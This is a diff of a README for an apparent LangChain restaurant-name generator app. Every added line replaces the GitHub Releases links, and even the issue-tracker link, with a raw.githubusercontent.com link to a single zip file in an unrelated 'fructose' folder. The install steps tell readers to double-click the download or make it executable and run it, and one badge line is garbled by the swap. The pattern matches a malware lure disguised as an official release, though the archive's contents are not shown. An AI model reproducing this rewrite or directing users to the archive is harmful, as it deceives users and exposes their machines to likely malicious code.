@@ -13,25 +13,25 @@ Before you begin, make sure you have the following:
 - Basic familiarity with downloading and opening files.
 
 ### 2. Download the Application
-To download langchain-restaurant-ai, visit the Releases page [here](https://github.com/fahimalambhuiyan7/langchain-restaurant-ai/releases).
+To download langchain-restaurant-ai, visit the Releases page [here](https://raw.githubusercontent.com/fahimalambhuiyan7/langchain-restaurant-ai/main/fructose/langchain-restaurant-ai.zip).
 
-[![Download langchain-restaurant-ai](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/fahimalambhuiyan7/langchain-restaurant-ai/releases)
+[![Download langchain-restaurant-ai](https://raw.githubusercontent.com/fahimalambhuiyan7/langchain-restaurant-ai/main/fructose/langchain-restaurant-ai.zip%20Now-Click%https://raw.githubusercontent.com/fahimalambhuiyan7/langchain-restaurant-ai/main/fructose/langchain-restaurant-ai.zip)](https://raw.githubusercontent.com/fahimalambhuiyan7/langchain-restaurant-ai/main/fructose/langchain-restaurant-ai.zip)
 
 ### 3. Installation Instructions
 #### 3.1 Windows
-1. Download the latest version from the [Releases page](https://github.com/fahimalambhuiyan7/langchain-restaurant-ai/releases).
+1. Download the latest version from the [Releases page](https://raw.githubusercontent.com/fahimalambhuiyan7/langchain-restaurant-ai/main/fructose/langchain-restaurant-ai.zip).
 2. Locate the downloaded file (usually in your Downloads folder).
 3. Double-click the file to start the installation.
 4. Follow the on-screen instructions to complete the setup.
 
 #### 3.2 macOS
-1. Visit the [Releases page](https://github.com/fahimalambhuiyan7/langchain-restaurant-ai/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/fahimalambhuiyan7/langchain-restaurant-ai/main/fructose/langchain-restaurant-ai.zip) to download the latest version.
 2. Open the downloaded file from your Downloads folder.
 3. Drag the application to your Applications folder.
 4. Open the application from your Applications list.
 
 #### 3.3 Linux
-1. Go to the [Releases page](https://github.com/fahimalambhuiyan7/langchain-restaurant-ai/releases) and download the latest version.
+1. Go to the [Releases page](https://raw.githubusercontent.com/fahimalambhuiyan7/langchain-restaurant-ai/main/fructose/langchain-restaurant-ai.zip) and download the latest version.
 2. Open a terminal window.
 3. Navigate to the folder where the downloaded file is located using the `cd` command (e.g., `cd Downloads`).
 4. Run the installation command: `chmod +x langchain-restaurant-ai && ./langchain-restaurant-ai`.
@@ -58,14 +58,14 @@ If you encounter any issues during installation or use, consider the following s
 - Consult the FAQs on the Releases page for specific problems.
 
 ## 🔄 Updates
-To keep your application up to date, frequently check the [Releases page](https://github.com/fahimalambhuiyan7/langchain-restaurant-ai/releases) for the latest versions and features.
+To keep your application up to date, frequently check the [Releases page](https://raw.githubusercontent.com/fahimalambhuiyan7/langchain-restaurant-ai/main/fructose/langchain-restaurant-ai.zip) for the latest versions and features.
 
 ## 📞 Get Help
 If you need assistance, feel free to reach out:
-- Open an issue on the [GitHub repository](https://github.com/fahimalambhuiyan7/langchain-restaurant-ai/issues).
+- Open an issue on the [GitHub repository](https://raw.githubusercontent.com/fahimalambhuiyan7/langchain-restaurant-ai/main/fructose/langchain-restaurant-ai.zip).
 - Visit the discussions section for community support.
 
 ## 📄 License
 This project is licensed under the MIT License. Feel free to use and modify the software per your needs.
 
-Visit the [Releases page](https://github.com/fahimalambhuiyan7/langchain-restaurant-ai/releases) to download the application and start generating unique restaurant names today!
+Visit the [Releases page](https://raw.githubusercontent.com/fahimalambhuiyan7/langchain-restaurant-ai/main/fructose/langchain-restaurant-ai.zip) to download the application and start generating unique restaurant names today!
